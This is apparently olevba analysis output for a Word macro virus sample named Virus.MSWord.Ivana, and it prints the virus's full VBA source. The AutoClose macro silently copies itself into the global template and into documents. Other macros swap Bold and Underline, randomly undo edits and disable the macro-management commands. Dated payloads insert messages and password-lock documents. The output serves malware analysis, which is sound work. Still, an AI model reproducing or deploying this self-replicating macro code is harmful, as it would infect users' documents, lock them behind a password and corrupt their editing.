olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Ivana
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Ivana - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO FileTemplates.bas 
in file: ./Virus.MSWord.Ivana - OLE stream: 'Macros/VBA/FileTemplates'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Changes the active template and the template options"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FileTemplates.MAIN"
Rem Dim dlg As FileTemplates
Rem GetCurValues dlg
Rem Dialog dlg
Rem FileTemplates dlg
End Sub
-------------------------------------------------------------------------------
VBA MACRO Toolsmacro.bas 
in file: ./Virus.MSWord.Ivana - OLE stream: 'Macros/VBA/Toolsmacro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Runs, creates, deletes, or revises a macro"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.Toolsmacro.MAIN"

End Sub
-------------------------------------------------------------------------------
VBA MACRO Underline.bas 
in file: ./Virus.MSWord.Ivana - OLE stream: 'Macros/VBA/Underline'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Formats the selection with a continuous underline (toggle)"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.Underline.MAIN"
WordBasic.Bold
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: ./Virus.MSWord.Ivana - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim total
Dim present
Dim cycle
Dim cy
Dim dan
Dim i
On Error GoTo -1: On Error GoTo fail
WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
total = WordBasic.CountMacros(0)
present = 0


If total > 0 Then

        For cycle = 1 To total
           If WordBasic.[MacroName$](cycle, 0) = "Ivana" Then
           present = 1
           End If
        Next cycle
End If

If present <> 1 Then
WordBasic.MacroCopy WordBasic.[FileName$]() + ":AutoClose", "Global:AutoClose", 1
WordBasic.MacroCopy WordBasic.[FileName$]() + ":Ivana", "Global:Ivana", 1
WordBasic.MacroCopy WordBasic.[FileName$]() + ":Underline", "Global:Underline", 1
WordBasic.MacroCopy WordBasic.[FileName$]() + ":Bold", "Global:Bold", 1
WordBasic.MacroCopy WordBasic.[FileName$]() + ":EditUndo", "Global:EditUndo", 1
WordBasic.MacroCopy WordBasic.[FileName$]() + ":ToolsMacro", "Global:ToolsMacro", 1
WordBasic.MacroCopy WordBasic.[FileName$]() + ":FileTemplates", "Global:FileTemplates", 1

End If

If present = 1 Then
        present = 0

total = WordBasic.CountMacros(1)
For cy = 1 To total
               If WordBasic.[MacroName$](cy, 1) = "Ivana" Then present = 1
Next cy
End If

If present = 0 Then
                WordBasic.FileSaveAs Format:=1
      WordBasic.MacroCopy "Global:AutoClose", WordBasic.[FileName$]() + ":AutoClose"
      WordBasic.MacroCopy "Global:Ivana", WordBasic.[FileName$]() + ":Ivana"
      WordBasic.MacroCopy "Global:Bold", WordBasic.[FileName$]() + ":Bold"
      WordBasic.MacroCopy "Global:Underline", WordBasic.[FileName$]() + ":Underline"
      WordBasic.MacroCopy "Global:EditUndo", WordBasic.[FileName$]() + ":EditUndo"
     WordBasic.MacroCopy "Global:ToolsMacro", WordBasic.[FileName$]() + ":Toolsmacro"
     WordBasic.MacroCopy "Global:FileTemplates", WordBasic.[FileName$]() + ":FileTemplates"

WordBasic.FileSave
End If
Rem End If

dan = WordBasic.WeekDay(WordBasic.Now())
If dan = 1 Then WordBasic.ViewRibbon (0)
If dan = 2 Then WordBasic.ToolsOptionsView VScroll:=0

If WordBasic.Day(WordBasic.Now()) = 13 Then
WordBasic.EndOfDocument
WordBasic.FontSize 15
For i = 1 To 10
WordBasic.InsertPara
Next i
WordBasic.Insert "Na kraju, samo jos da kazem: volim te, Ivana [by utik]"
WordBasic.InsertPara
WordBasic.Insert "And finally, I would like to say: I love you, Ivana [by utik]"
WordBasic.StartOfDocument
End If

If WordBasic.Day(WordBasic.Now()) = 4 And WordBasic.Month(WordBasic.Now()) = 7 Then
WordBasic.EndOfDocument
WordBasic.InsertPara
WordBasic.Bold
WordBasic.FontSize 18
WordBasic.Insert "Ivana"
WordBasic.FileSaveAs Password:="Ivana"
WordBasic.FileSave
End If
fail:
End Sub
-------------------------------------------------------------------------------
VBA MACRO EditUndo.bas 
in file: ./Virus.MSWord.Ivana - OLE stream: 'Macros/VBA/EditUndo'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Reverses the last action"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.EditUndo.MAIN"
If WordBasic.Second(WordBasic.Now()) > 15 Then WordBasic.EditUndo
End Sub
-------------------------------------------------------------------------------
VBA MACRO Ivana.bas 
in file: ./Virus.MSWord.Ivana - OLE stream: 'Macros/VBA/Ivana'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
' Dedicated to Ivana, the only one
' [by utik]
End Sub
-------------------------------------------------------------------------------
VBA MACRO Bold.bas 
in file: ./Virus.MSWord.Ivana - OLE stream: 'Macros/VBA/Bold'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Makes the selection bold (toggle)"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.Bold.MAIN"
WordBasic.Underline
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

